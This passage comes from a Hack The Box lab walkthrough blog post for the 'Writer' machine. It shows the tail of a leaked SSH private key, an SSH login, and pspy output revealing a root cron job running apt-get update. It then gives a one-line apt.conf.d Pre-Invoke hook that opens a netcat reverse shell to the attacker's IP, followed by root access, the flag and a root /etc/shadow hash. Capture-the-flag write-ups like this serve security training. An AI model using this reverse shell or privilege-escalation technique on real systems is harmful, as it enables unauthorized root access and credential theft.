class="line">2BdgeQ7loiRBng6WrRlXazS++5NjI3rWL5cmHJ1H8VN6Z23+ee0O8x62IoYKdWqKWSCEGu</span><br><span class="line">dvMK1rPd3Mgj5x1lrM7nXTEuMbJEAoX8+AAxQ6KcEABWZ1xmZeA4MLeQTBMeoB+1HYYm+1</span><br><span class="line">3NK8iNqGBR7bjv2XmVY6tDJaMJ+iJGdQAAAMEAz9h/44kuux7/DiyeWV/+MXy5vK2sJPmH</span><br><span class="line">Q87F9dTHwIzXQyx7xEZN7YHdBr7PHf7PYd4zNqW3GWL3reMjAtMYdir7hd1G6PjmtcJBA7</span><br><span class="line">Vikbn3mEwRCjFa5XcRP9VX8nhwVoRGuf8QmD0beSm8WUb8wKBVkmNoPZNGNJb0xvSmFEJ/</span><br><span class="line">BwT0yAhKXBsBk18mx8roPS+wd9MTZ7XAUX6F2mZ9T12aIYQCajbzpd+fJ/N64NhIxRh54f</span><br><span class="line">Nwy7uLkQ0cIY6XAAAAC2pvaG5Ad3JpdGVyAQIDBAUGBw==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>Now we have john ssh so let’s login as john</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Writer$ ssh -i id_rsa john@writer.htb </span><br><span class="line">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"> System information disabled due to load higher than 2.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Thu Aug  5 13:36:13 2021 from 10.10.14.59</span><br><span class="line">john@writer:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(john) gid=1001(john) <span class="built_in">groups</span>=1001(john),1003(management)</span><br></pre></td></tr></table></figure>

<h2 id="Enumeration-3"><a href="#Enumeration-3" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>We can see that we are in management group so let’s see what files and directory we can access.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john@writer:/etc/apt$ find / -group management 2&gt;/dev/null</span><br><span class="line">/etc/apt/apt.conf.d</span><br></pre></td></tr></table></figure>

<p>oh this is intresting.</p>
<p>searching for ‘writable files in &#x2F;etc&#x2F;apt&#x2F;apt.conf.d privESC’ in google we can find the below article which explains gretaly what we have to do to abuse that for privESC.</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL2xpbnV4LWZvci1wZW50ZXN0ZXItYXB0LXByaXZpbGVnZS1lc2NhbGF0aW9uLw==">https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/<i class="fa fa-external-link-alt"></i></span></p>
<p>Looking through the article there should be something running ‘sudo apt-get update’ command so let’s see if there is anything running that command using pspy64.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">john@writer:/home/kyle$ ./pspy64s -pf -i 1000 </span><br><span class="line">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ </span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ </span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  </span><br><span class="line">                   ░           ░ ░     </span><br><span class="line">                               ░ ░     </span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=<span class="literal">true</span>): processes=<span class="literal">true</span> | file-system-events=<span class="literal">true</span> ||| Scannning <span class="keyword">for</span> processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br><span class="line">&lt;--SNIP--&gt;</span><br><span class="line">2021/08/05 16:51:06 CMD: UID=0    PID=374426 | /usr/bin/apt-get update</span><br><span class="line">2021/08/05 16:51:06 CMD: UID=0    PID=374417 | /usr/bin/apt-get update</span><br><span class="line">2021/08/05 16:51:06 CMD: UID=0    PID=374411 | /bin/sh -c /usr/bin/apt-get update</span><br><span class="line">2021/08/05 16:51:06 CMD: UID=0    PID=374406 | /usr/sbin/CRON -f</span><br><span class="line">&lt;--SNIP--&gt;</span><br></pre></td></tr></table></figure>

<p>So now we have the prerequiste satify so we can start with exploitation.</p>
<h2 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>so we have can create a malicious line in &#x2F;etc&#x2F;apt&#x2F;apt.conf.d&#x2F; to get command execution so let’s do that before that spin up the listener on your fav port.</p>
<p>And the let’s create a file that gets us the reverse shell.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john@writer:~$ <span class="built_in">echo</span> <span class="string">&#x27;apt::Update::Pre-Invoke &#123;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.31 2234 &gt;/tmp/f&quot;&#125;;&#x27;</span> &gt; /etc/apt/apt.conf.d/oops</span><br></pre></td></tr></table></figure>

<p>and boom we have the shell.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/writer]</span><br><span class="line">└─<span class="comment"># nc -lvp 2234</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::2234</span><br><span class="line">Ncat: Listening on 0.0.0.0:2234</span><br><span class="line">Ncat: Connection from 10.10.11.101.</span><br><span class="line">Ncat: Connection from 10.10.11.101:35406.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># cd /root</span></span><br><span class="line"><span class="string"># cat root.txt</span></span><br><span class="line"><span class="string">84812ca924eff7423778631959635207</span></span><br><span class="line"><span class="string"># cat /etc/shadow | grep root</span></span><br><span class="line"><span class="string">root:$6$gev1Op0YfgboE7iR$iMNbP.8qic/SzTr4atxwLbkI7nScyZWJPbTgoXAlEz5Hcw3Ntget9j3p.iccPcw5Jl4dj4bHWZ5LvoLLNC8iB.:18816:0:99999:7:::</span></span><br></pre></td></tr></table></figure>

<p>Now we are root let’s get all the flags.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2066.jpg"></li>
</ul>
<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
<li>smb enumeration</li>
<li>Directory Fuzzing</li>
<li>Sql Injection fuzz</li>
<li>Sql Injection payload modify</li>
<li>Sql Injection to read files</li>
<li>python code execution to get rev shell</li>
<li>hashcat crack hash</li>
<li>Pspy64 enum process</li>
<li>get rev shell through DISCLAIMER FILE and send mail</li>
<li>PrivESC through apt privilege escalation</li>
</ul>
<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2021/08/06/writer/" title="Hack-The-Box-walkthrough[writer]">https://fdlucifer.github.io/2021/08/06/writer/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/07/26/bountyhunter/" rel="prev" title="Hack-The-Box-walkthrough[bountyhunter]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[bountyhunter]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/08/08/previse/" rel="next" title="Hack-The-Box-walkthrough[previse]">
                  Hack-The-Box-walkthrough[previse] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">630k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">38:09</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
